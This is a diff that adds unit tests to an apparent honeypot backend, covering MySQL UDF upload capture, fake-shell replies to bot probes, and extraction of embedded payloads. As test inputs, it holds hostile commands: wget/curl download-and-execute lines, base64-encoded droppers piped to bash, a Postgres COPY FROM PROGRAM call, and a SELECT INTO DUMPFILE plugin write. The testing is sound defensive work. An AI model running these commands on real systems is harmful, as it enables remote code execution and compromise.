@@ -1,4 +1,5 @@
 """Unit-Tests: python3 -m unittest -v (im Verzeichnis backend/)."""
+import base64
 import hashlib
 import http.client
 import json
@@ -22,6 +23,7 @@ import paramiko
 import intel
 import parsers
 import samples
+import shelltext
 import sensors
 import stats
 import visits
@@ -265,6 +267,23 @@ class MySQLHoneypotTests(HoneypotBase):
         self.connect().close()
         self.assertEqual(self.wait_events(1)[0][1:], ("low", "Connection without login (service detection)"))
 
+    def test_udf_upload_is_saved_as_sample(self):
+        login = (struct.pack("<I", 0x0008A20F) + struct.pack("<I", 1 << 24) + b"\x21" + b"\0" * 23
+                 + b"root\0" + bytes([20]) + b"x" * 20 + b"\0" + b"mysql_native_password\0")
+        udf = b"\x7fELF\x02\x01\x01" + b"\x00" * 11 + b"\x3e\x00" + b"\x90" * 6000  # x86-64, größer als MAX_PACKET
+        with self.connect() as sock:
+            sock.sendall(honeypot_mysql.packet(1, login))
+            honeypot_mysql._read_packet(sock)
+            sock.sendall(honeypot_mysql.packet(0, b"\x03select @@max_allowed_packet"))
+            replies = [honeypot_mysql._read_packet(sock)[1] for _ in range(5)]
+            self.assertIn(b"16777216", replies[3])
+            sock.sendall(honeypot_mysql.packet(0, b"\x03SELECT 0x" + udf.hex().encode()
+                                               + b" INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'"))
+            honeypot_mysql._read_packet(sock)
+        rows = self.wait_events(4)
+        self.assertEqual(rows[-1][0], "Malware-Sample")
+        self.assertIn(f"· {len(udf)} B · ELF x86-64 · hex: SELECT 0x7f454c46", rows[-1][2])
+
 
 class PostgresHoneypotTests(HoneypotBase):
     def setUp(self):
@@ -469,6 +488,34 @@ class FakeShellTests(unittest.TestCase):
         self.assertFalse(samples.looks_executable(b"ABC"))
         self.assertFalse(samples.looks_executable(b"\x7fELF\x01\x01" + b"\x00" * 25))  # Dropper-Test mit ELF-Kopf
         self.assertTrue(samples.looks_executable(b"#!/bin/sh\nwget http://x/a; sh a"))
+
+    def test_shell_check_bot_gets_real_shell_answers(self):
+        h, server = "check_ab12", fakeshell.SERVER
+        q = "'\"'\"'"  # so verschachtelt der Bot seine Anführungszeichen in sh -c '…'
+        self.assertEqual(fakeshell.respond(f"sh -c 'printf {q}\\n%s|%s\\n{q} {q}{h}_pid{q} \"$$\"'", server),
+                         f"\r\n{h}_pid|{shelltext.PID}\r\n")
+        self.assertEqual(fakeshell.respond(f"echo '{h}_math|'\"$((845*54+51))\"", server), f"{h}_math|45681\r\n")
+        self.assertEqual(fakeshell.respond(f"set -- a1 a2; echo \"$1|$2|$#\"", server), "a1|a2|2\r\n")
+        self.assertEqual(fakeshell.respond(f"f_x() {{ echo '{h}_func|'\"$1\"; }}; f_x ok", server), f"{h}_func|ok\r\n")
+        self.assertEqual(fakeshell.respond(f"sh -c 'f_y() {{ echo \"$1\"; }}; f_y inner'", server), "inner\r\n")
+        self.assertEqual(fakeshell.respond("echo $(whoami) `hostname` $HOME", server), "root web01 /root\r\n")
+
+    def test_embedded_payloads(self):
+        script = b"cd /tmp; wget http://203.0.113.9/m.x86; chmod +x m.x86; ./m.x86"
+        line = f"echo {base64.b64encode(script).decode()} | base64 -d | bash"
+        self.assertEqual(samples.embedded(line), [(script, "base64")])
+        elf = b"\x7fELF\x01\x01" + b"\x00" * 200
+        self.assertEqual(samples.embedded(f"SELECT lo_from_bytea(0, decode('{elf.hex()}', 'hex'))"), [(elf, "hex")])
+        self.assertEqual(samples.embedded("SELECT 0x" + "00" * 300), [])  # keine Programmdatei
+
+    def test_payloads_find_downloads_in_strings_and_base64(self):
+        pot, got = honeypot_telnet.TelnetHoneypot(Store(":memory:"), port=0, host="127.0.0.1"), []
+        pot.fetch = lambda ip, url: got.append(url)
+        pot.payloads("203.0.113.1", "sh -c 'cd /tmp; wget http://203.0.113.9/a.sh'")
+        pot.payloads("203.0.113.1", "COPY t FROM PROGRAM 'curl -s http://203.0.113.9/b.sh | bash'")
+        script = base64.b64encode(b"#!/bin/sh\ncd /tmp\ncurl -O http://203.0.113.9/c.x86\n").decode()
+        pot.payloads("203.0.113.1", f"echo {script} | base64 -d | sh")
+        self.assertEqual(got, ["http://203.0.113.9/a.sh", "http://203.0.113.9/b.sh", "http://203.0.113.9/c.x86"])
 
     def test_server_profile_answers_recon(self):
         server = fakeshell.SERVER
